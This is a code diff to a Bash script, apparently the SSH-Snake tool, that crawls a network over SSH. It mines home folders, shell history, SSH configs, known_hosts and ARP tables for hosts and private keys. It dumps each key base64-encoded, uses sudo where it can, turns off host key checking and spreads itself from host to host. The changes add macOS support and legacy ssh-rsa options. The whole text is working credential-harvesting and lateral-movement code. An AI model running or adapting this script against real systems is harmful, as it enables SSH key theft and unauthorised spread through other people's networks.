@@ -59,7 +59,7 @@ scan_paths_depth=3 # [3|n]: If using scan_paths, specify the max-depth. Set to 9
 ######
 ######
 
-use_find_from_hosts=1 # [1|0]: Attempt to find hosts using `getent ahostsv4` (also know as /etc/hosts).
+use_find_from_hosts=1 # [1|0]: Attempt to find hosts using /etc/hosts
 
 use_find_arp_neighbours=1 # [1|0]: arp neighbours may be interesting hosts.
 
@@ -209,11 +209,11 @@ declare -A current_ips
 declare -A ignore_list_array
 
 _ignored_hosts["openssh.com"]=1
+_ignored_hosts["255.255.255.255"]=1
 
 # GLOBALS
 ignore_separator="|"
-ssh_options=(-oIdentitiesOnly=yes -oServerAliveInterval=300 -oTCPKeepAlive=no -oConnectTimeout="$ssh_timeout" -oStrictHostKeyChecking=no -oGlobalKnownHostsFile=/dev/null -oUserKnownHostsFile=/dev/null -oBatchMode=yes)
-ssh_extra_options=(-oHostkeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1)
+ssh_options=(-oControlPath=none -oIdentitiesOnly=yes -oServerAliveInterval=300 -oTCPKeepAlive=no -oConnectTimeout="$ssh_timeout" -oStrictHostKeyChecking=no -oGlobalKnownHostsFile=/dev/null -oUserKnownHostsFile=/dev/null -oBatchMode=yes)
 user="$USER"
 script="$1"
 hosts_chain="$(printf "%s" "$2" | base64 -d)" # This contains the exact chain we used to connect between servers.
@@ -382,11 +382,6 @@ shape_script() {
   local opt_function_list
   local opt_function
   local ssh_dest
-
-  if ! command -v sed >/dev/null 2>&1; then
-    printf "Could not begin because 'sed' is not available!\n"
-    exit 1
-  fi
 
   opt_function_list=("use_combinate_interesting_users_hosts" "use_combinate_users_hosts_aggressive" "use_find_from_hosts" "use_find_from_last" "use_find_from_authorized_keys" "use_find_from_known_hosts" "use_find_from_ssh_config" "use_find_from_bash_history" "use_find_arp_neighbours" "use_find_d_block" "use_find_from_hashed_known_hosts" "use_find_from_prev_dest" "use_find_from_ignore_list" "use_retry_all_dests")
 
@@ -577,34 +572,54 @@ EOF
   printf "\nThanks for playing!\n"
 }
 
+# Check each of the required programs and bash version.
+# Prints the missing command on fail.
+check_commands() {
+  local required_commands
+  local required_command
+
+  required_commands=("ssh-keygen" "readlink" "ssh" "basename" "base64" "awk" "sort" "grep" "tr" "find" "cat" "stdbuf") # "sudo" "hostname" "xargs" "getent" "ifconfig" "ipconfig" "ip" "timeout" "dscacheutil" are all semi-optional. "sed" is necessary only by the first system.
+
+  for required_command in "${required_commands[@]}"; do
+    if ! command -v "$required_command" >/dev/null 2>&1; then
+      echo "$required_command"
+      return
+    fi
+  done
+
+  if [[ "${BASH_VERSINFO:-0}" -lt 4 ]]; then
+    echo "bash"
+    return
+  fi
+}
+
 # Ensures that the server is running bash and has all of the required inbuilts and programs required for the script to run.
 # If a version of bash is not compatible with the script, it reports the version but does not continue.
 # If any of the required programs/inbuilts are missing, it also reports the violation and quits.
 check_startup() {
-  local required_commands
-  local required_command
+  local missing_command
 
-  required_commands=("ssh-keygen" "readlink" "getconf" "ssh" "basename" "base64" "getent" "awk" "sort" "grep" "tr" "find" "cat" "stdbuf") # "sudo" "hostname" "xargs" are all optional.
-
-  if [[ "${BASH_VERSINFO:-0}" -lt 4 ]]; then
-    printf "INTERNAL_MSG: command not found: BASH%d: %s\n" "${BASH_VERSINFO[0]}" "${BASH_VERSINFO[*]}"
-    exit 1
-  fi
-
-  for required_command in "${required_commands[@]}"; do
-    if ! command -v "$required_command" >/dev/null 2>&1; then
-      printf "INTERNAL_MSG: command not found: %s\n" "$required_command"
-      exit 1
-    fi
-  done
+  missing_command="$(check_commands)"
 
   # This is the beginning of the main script: print_snake, print_settings, then shape_script (which executes the script via stdin)
   if [[ -z "$script" ]]; then
+    if ! command -v sed >/dev/null 2>&1; then
+      printf "Could not begin because 'sed' is not available!\n"
+      exit 1
+    elif [[ -n "$missing_command" ]]; then
+      printf "Could not begin because %s is not available!\n" "$missing_command"
+      exit 1
+    fi
     print_snake
     print_settings
     shape_script
     fin_root
     exit 0
+  fi
+
+  if [[ -n "$missing_command" ]]; then
+    printf "INTERNAL_MSG: command not found: %s\n" "$required_command"
+    exit 1
   fi
 
   if ! printf "%s" "$script" | base64 -d >/dev/null 2>&1; then
@@ -626,7 +641,7 @@ fin() {
 # If use_sudo is set, we check whether we are able to use sudo.
 # If we can use sudo, set $s with the sudo command.
 check_sudo() {
-  [[ $use_sudo -eq 1 ]] && command -v sudo >/dev/null 2>&1 && sudo -n true >/dev/null 2>&1 && s="sudo"
+  [[ $use_sudo -eq 1 ]] && sudo -n true >/dev/null 2>&1 && s="sudo"
 }
 
 # Different versions of ssh-keygen support different options.
@@ -639,7 +654,13 @@ check_sshkeygen() {
 # Older versions of ssh-keygen do not support the appending of HostkeyAlgorithms and KexAlgorithms values.
 # Don't use them unless they're supported.
 check_ssh_options() {
-  [[ $(ssh -oHostkeyAlgorithms=+ssh-rsa 2>&1) =~ Bad\ protocol\ 2\ host\ key\ algorithms|Bad\ SSH2\ KexAlgorithms ]] || ssh_options+=("${ssh_extra_options[@]}")
+  local ssh_extra_options
+  local ssh_extra_option
+
+  ssh_extra_options=(-oHostkeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1 -oPubkeyAcceptedKeyTypes=+ssh-rsa)
+  for ssh_extra_option in "${ssh_extra_options[@]}"; do
+    [[ $(ssh "$ssh_extra_option" 2>&1) =~ Bad\ protocol\ 2\ host\ key\ algorithms|Bad\ SSH2\ KexAlgorithms|Bad\ key\ types ]] || ssh_options+=("$ssh_extra_option")
+  done
 }
 
 # Determining the ip address of the current destination is difficult because it may have multiple ip addresses, and we are likely to connect to both of them eventually (including 127.0.0.1 for example).
@@ -659,22 +680,33 @@ init_current_ips() {
   local current_ip
   local default_route
   local default_ip
+  local iface
 
   # Create the current_ips array containing all of the ipv4 addresses of the destination.
-  if command -v hostname >/dev/null 2>&1; then
+  while IFS= read -r current_ip; do
+    current_ips["$current_ip"]=1
+  done < <(${s} hostname -I 2>/dev/null | tr ' ' '\n' | grep -F '.')
+
+  # mac support
+  while IFS= read -r iface; do
     while IFS= read -r current_ip; do
       current_ips["$current_ip"]=1
-    done < <(${s} hostname -I 2>/dev/null | tr ' ' '\n' | grep -F '.')
-    current_hostnames_ip="$(IFS=:; echo "${!current_ips[*]}")"
-  fi
+    done < <(${s} ipconfig getifaddr "$iface" 2>/dev/null)
+  done < <(${s} ifconfig -l 2>/dev/null | tr ' ' '\n')
+
+  current_hostnames_ip="$(IFS=:; echo "${!current_ips[*]}")"
 
   # Then, determine the ip address for connecting to the default gateway. Otherwise, to the internet.
   # sudo is required on some systems, so use it if possible.
-  if command -v ip >/dev/null 2>&1; then
-    default_route="$(${s} ip route show default | awk '/default via/{print $3; exit}')"
+  if ip route show default >/dev/null 2>&1; then
+    default_route="$(${s} ip route show default 2>/dev/null | awk '/default via/{print $3; exit}')"
     default_route="${default_route:-"1.1.1.1"}"
-    default_ip="$(${s} ip route get "$default_route" | awk -F'src' '{print $NF; exit}' | awk '{print $1}')"
+    default_ip="$(${s} ip route get "$default_route" 2>/dev/null | awk -F'src' '{print $NF; exit}' | awk '{print $1}')"
+  elif route -n get 1.1.1.1 >/dev/null 2>&1; then
+    iface="$(${s} route -n get 1.1.1.1 2>/dev/null | awk '/interface: / {print $2;exit}')"
+    default_ip="$(${s} ipconfig getifaddr "$iface" 2>/dev/null)"
   fi
+
   default_ip="${default_ip:-"???"}"
 
   # If $this_host has not been passed to us, set our address to the default ip address.
@@ -743,7 +775,7 @@ init_ignored() {
 
   for ignored_dest in "${ignored_dests[@]}"; do
     is_ssh_dest "$ignored_dest" && _ignored_dests["$ignored_dest"]=1
-    for current_ip in "${!current_ips[@]}"; do # TODO: Can use current_ips[*] as a one-liner. Also should we be alerting that we got to an ignored dest somehow?
+    for current_ip in "${!current_ips[@]}"; do
       [[ "$ignored_dest" == "$user@$current_ip" ]] && fin
     done
   done
@@ -854,22 +886,22 @@ exec_custom_cmds() {
   done
 }
 
-# Creates a list of home folders using both getent passwd(/etc/passwd) and listing the directories in /home/.
+# Creates a list of home folders using both getent passwd(/etc/passwd) (if possible) and listing the directories in /home/ and /Users.
 # /home/ may contain deleted users' data still, therefore /etc/passwd is not completely reliable.
 find_home_folders() {
   local home_folder
 
   while IFS= read -r home_folder; do
     [[ -v 'home_folders["$home_folder"]' || ${#home_folders["$home_folder"]} -gt 0 ]] && continue
-    home_folder="$(readlink -m -- "$home_folder")"
+    home_folder="$(readlink -m -- "$home_folder" 2>/dev/null)"
     is_dir "$home_folder" && home_folders["$home_folder"]=1
-  done < <(${s} find -L "/home/" -mindepth 1 -maxdepth 1 -type d 2>/dev/null)
+  done < <(${s} find -L "/home" "/Users" -mindepth 1 -maxdepth 1 -type d 2>/dev/null)
 
   while IFS=: read -r _ _ _ _ _ home_folder _; do
     [[ -v 'home_folders["$home_folder"]' || ${#home_folders["$home_folder"]} -gt 0 ]] && continue
-    home_folder="$(readlink -m -- "$home_folder")"
+    home_folder="$(readlink -m -- "$home_folder" 2>/dev/null)"
     is_dir "$home_folder" && home_folders["$home_folder"]=1
-  done < <(getent passwd)
+  done < <(getent passwd 2>/dev/null)
 }
 
 # Discovers all files in the .ssh/ directories of all home folders.
@@ -911,7 +943,7 @@ check_file_for_privkey() {
 
   is_file "$key_file" || return 1
 
-  read -r -n 50 file_header < <(${s} cat -- "$key_file") # cat is faster than head.
+  read -r -n 50 file_header < <(${s} cat -- "$key_file" 2>/dev/null) # cat is faster than head.
   for key_header in "${known_key_headers[@]}"; do
     if [[ "$file_header" == *"$key_header"* ]]; then
       return 0
@@ -961,7 +993,7 @@ populate_keys() {
     chained_print ": Discovered unusable private key in [$key_file]"
 
   fi
-  chained_print ": EXTERNAL_MSG: KEY[$key_file]: $(${s} cat -- "$key_file" | base64 | tr -d '\n')"
+  chained_print ": EXTERNAL_MSG: KEY[$key_file]: $(${s} cat -- "$key_file" 2>/dev/null | base64 | tr -d '\n')"
   return 0
 }
 
@@ -979,7 +1011,7 @@ check_and_populate_keys() {
   [[ -v 'priv_keys_files["$unresolved_key_file"]' || ${#priv_keys_files["$unresolved_key_file"]} -gt 0 ]] && return 0
   [[ -v 'key_files["$unresolved_key_file"]' || ${#key_files["$unresolved_key_file"]} -gt 0 ]] && return 1
 
-  key_file="$(${s} readlink -m -- "$unresolved_key_file")"
+  key_file="$(${s} readlink -m -- "$unresolved_key_file" 2>/dev/null)" # use sudo because it may be a symlink in a priviliged location, not that it would really matter (ssh will just use the symlink)
 
   [[ -v 'priv_keys_files["$key_file"]' || ${#priv_keys_files["$key_file"]} -gt 0 ]] && priv_keys_files["$unresolved_key_file"]=1 && return 0
   [[ -v 'key_files["$key_file"]' || ${#key_files["$key_file"]} -gt 0 ]] && key_files["$unresolved_key_file"]=1 && return 1
@@ -1070,7 +1102,7 @@ find_from_bash_history() {
     home_file="$home_folder/.bash_history"
     is_file "$home_file" || continue
 
-    home_user="$(basename -- "$home_folder")"
+    home_user="$(basename -- "$home_folder" 2>/dev/null)"
 
     while IFS= read -r bash_history_line; do
       local ssh_dest
@@ -1207,7 +1239,7 @@ find_from_bash_history() {
       [[ -z "$cached_ssh_user" ]] && add_ssh_user "$home_user" && cached_ssh_user="$home_user" # XXX: Can we parse ssh_config and detect Host [host] corresponds to a user, instead?
 
       [[ -n "$cached_ssh_user" && -n "$cached_ssh_host" ]] && add_ssh_dest "$cached_ssh_user@$cached_ssh_host"
-    done < <(${s} grep -E '^(ssh|scp|rsync) ' -- "$home_file" | sort -u)
+    done < <(${s} grep -E '^(ssh|scp|rsync) ' -- "$home_file" 2>/dev/null | sort -u)
   done
 }
 
@@ -1231,7 +1263,7 @@ find_from_ssh_config() {
 
     is_dir "$home_folder/.ssh" || continue
 
-    home_user="$(basename -- "$home_folder")"
+    home_user="$(basename -- "$home_folder" 2>/dev/null)"
 
     while IFS= read -r ssh_file; do
       is_file "$ssh_file" || continue
@@ -1265,7 +1297,7 @@ find_from_ssh_config() {
             check_potential_key_files "$cline_val" "$home_folder"
             ;;
         esac
-      done < <(${s} grep -iE 'Host|HostName|User|IdentityFile' -- "$ssh_file" | sort -u)
+      done < <(${s} grep -iE 'Host|HostName|User|IdentityFile' -- "$ssh_file" 2>/dev/null | sort -u)
     done < <(${s} find -L "$home_folder/.ssh" -type f -readable 2>/dev/null)
   done
 }
@@ -1303,7 +1335,7 @@ find_from_authorized_keys() {
         add_ssh_host "$ssh_host"
         [[ -n "$home_user" ]] && add_ssh_dest "$home_user@$ssh_host"
       done < <(echo "$ssh_address" | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort -u)
-    done < <(${s} grep -F 'from=' -- "$ssh_file" | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort -u)
+    done < <(${s} grep -F 'from=' -- "$ssh_file" 2>/dev/null | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort -u)
   done
 }
 
@@ -1311,7 +1343,6 @@ find_from_authorized_keys() {
 find_from_last() {
   local ssh_dest
 
-  command -v "last" >/dev/null 2>&1 || return
   last -aiw >/dev/null 2>&1 || return
 
   while IFS= read -r ssh_dest; do
@@ -1363,7 +1394,11 @@ find_from_hosts() {
 
   while IFS= read -r ssh_host; do
     add_ssh_host "$ssh_host"
-  done < <(getent ahostsv4 2>/dev/null | awk -F"  " '{print $NF}' | tr ' ' '\n' | sort -u) # skip ipv6 for now
+  done < <(getent ahostsv4 2>/dev/null | awk -F"  " '{print $NF}' | tr ' ' '\n' | sort -u) # skip ipv6 for now, might be tab.
+
+  while IFS=": " read -r _ ssh_host; do
+    add_ssh_host "$ssh_host"
+  done < <(dscacheutil -q host 2>/dev/null | grep -F 'ip_address:' | sort -u)
 }
 
 # Neighbouring hosts that announce themselves via ARP may be interesting.
@@ -1373,6 +1408,10 @@ find_arp_neighbours() {
   while IFS= read -r ssh_host; do
     add_ssh_host "$ssh_host"
   done < <(ip neigh 2>/dev/null | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort -u) # ignore ipv6 and ignore gateway
+
+  while IFS= read -r ssh_host; do
+    add_ssh_host "$ssh_host"
+  done < <(arp -a 2>/dev/null | awk -F"\\\(|\\\)" '{print $2}' | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort -u) # ignore ipv6 and ignore gateway
 }
 
 # Neighbouring d-block hosts (x.x.x.0-x.x.x.255) may be interesting.
@@ -1509,7 +1548,7 @@ find_from_hashed_known_hosts() {
       IFS='.' read -ra octets < <(echo "$current_ip")
       [[ ${#octets[@]} -eq 4 ]] || continue
 
-      if command -v "xargs" >/dev/null 2>&1; then
+      if command -v xargs >/dev/null 2>&1; then
         for i in {0..255}; do
           # break if there are no hashed known hosts left.
           [[ $hashed_number -lt 1 ]] && break
@@ -1633,10 +1672,33 @@ combinate_interesting_users_hosts() {
 }
 
 # Deduplicate ssh_dests by resolving the hosts for each ssh_dest, checking whether the user, host, or resolved dest is ignored, then adding the destinations back to the original ssh_dests array.
+# TODO: doesn't support hosts with multiple hosts (4 ips for 1 domain), and in fact may even break that.
 deduplicate_resolved_hosts_keys() {
   local ssh_dest
   declare -A valid_ssh_dests
   declare -A resolved_hosts
+  local res
+  local mac
+  local to
+
+  # DNS timeout of 5 seconds per address (bleh, hack).
+  if command -v timeout >/dev/null 2>&1; then
+    to="timeout 5"
+  fi
+
+  # Use getent if it's available.
+  if getent ahostsv4 -- 1.1.1.1 >/dev/null 2>&1; then
+    res="$to getent ahostsv4 --"
+  # Otherwise dscacheutils for mac.
+  elif dscacheutil -q host -a name 1.1.1.1 >/dev/null 2>&1; then
+    res="$to dscacheutil -q host -a name"
+    mac="1"
+  else
+    # If we can't use getent or dscacheutil, we're on an unknown type of system (with bash?!)
+    # Use printf instead of chained_print() to be consistent.
+    printf "INTERNAL_MSG: command not found: RESOLVE (%s)\n" "$(uname -a 2>/dev/null)"
+    fin
+  fi
 
   # Pre-resolve each host concurrently in the hope that the answers will be cached.
   for ssh_dest in "${!ssh_dests[@]}"; do
@@ -1647,7 +1709,7 @@ deduplicate_resolved_hosts_keys() {
     [[ -v 'resolved_hosts["$ssh_host"]' || ${#resolved_hosts["$ssh_host"]} -gt 0 ]] && continue
 
      resolved_hosts["$ssh_host"]=1
-    (getent ahostsv4 -- "$ssh_host" > /dev/null 2>&1 &)
+    ($res "$ssh_host" > /dev/null 2>&1 &)
   done
 
   wait
@@ -1671,11 +1733,17 @@ deduplicate_resolved_hosts_keys() {
     if [[ -v 'resolved_hosts["$ssh_host"]' || ${#resolved_hosts["$ssh_host"]} -gt 0 ]]; then
       resolved_ssh_host="${resolved_hosts["$ssh_host"]}"
     else
-      # If the host has not already been resolved, resolve it using getent.
-      resolved_ssh_host="$(getent ahostsv4 -- "$ssh_host" 2>/dev/null)"
-      resolved_ssh_host="${resolved_ssh_host%% *}"
+      # If the host has not already been resolved, resolve it.
+      # macos
+      if [[ -n "$mac" ]]; then
+        resolved_ssh_host="$($res "$ssh_host" 2>/dev/null | grep -F 'ip_address:')"
+        resolved_ssh_host="${resolved_ssh_host#* }" # format is 'ip_address: ip'
+      else
+        resolved_ssh_host="$($res "$ssh_host" 2>/dev/null)"
+        resolved_ssh_host="${resolved_ssh_host%% *}" # format is 'ip\t[junk]
+      fi
 
-      # Answer must begin with 1 or 2 (getent ahosts v4 0.1.2.3 will respond with 0.1.2.3).
+      # Answer must begin with 1 or 2 ($res 0.1.2.3 will respond with 0.1.2.3).
       if [[ "${resolved_ssh_host:0:1}" =~ [12] ]]; then
         [[ "$resolved_ssh_host" =~ ^127\. ]] && resolved_ssh_host="127.0.0.1" # If it's loopback, always use 127.0.0.1
         # Cache the host
@@ -1837,10 +1905,18 @@ rs_chained_print() {
 }
 
 # Call rs_chained_print twice, with separate chains.
-# $1 is chain 1, $2 is chain 2, and $3 is what to print.
+# $1 is chain 1, $2 is chain 2, and $3 is what to print
 double_rs_chained_print() {
+  local ssh_dest
+  local ssh_host
+  local ssh_user
+
+  ssh_dest="$3"
+  ssh_user="${ssh_dest%%@*}"
+  ssh_host="${ssh_dest#*@}"
+
   rs_chained_print "$1" "$3"
-  rs_chained_print "$2" "($3)"
+  rs_chained_print "$2" "$ssh_user@($ssh_host)"
 }
 
 # The main SSH function of the script.
@@ -1910,7 +1986,7 @@ recursive_scan() {
         # It may be useful to take the ignore_list and set those ip destinations as ignored_dests.
         if [[ "$line" == *"Argument list too long"* ]]; then
           double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
-          rs_chained_print "$t_hosts_chain" "$ssh_dest [ARG_LIMIT:$(getconf -a | awk '/ARG_MAX/{print $NF; exit}'), $(printf "%s" "$ignore_list" | base64 | tr -d '\n')]"
+          rs_chained_print "$t_hosts_chain" "$ssh_dest [ARG_LIMIT:$(getconf -a 2>/dev/null | awk '/ARG_MAX/{print $NF; exit}'), $(printf "%s" "$ignore_list" | base64 | tr -d '\n')]"
           printf "INTERNAL_MSG: ARG_LIMIT\n"
           fin
         fi
@@ -2013,7 +2089,7 @@ recursive_scan() {
         # Github, too.
         #
         # Invalid command: cmd
-        if [[ "$line" == "Invalid command:"* ]]; then #Github
+        if [[ "$line" == "Invalid command: "* || "$line" == "exec request failed on channel "* ]]; then #Github
           double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
           rs_chained_print "$t_hosts_chain" "$ssh_dest [GitHub]"
           break
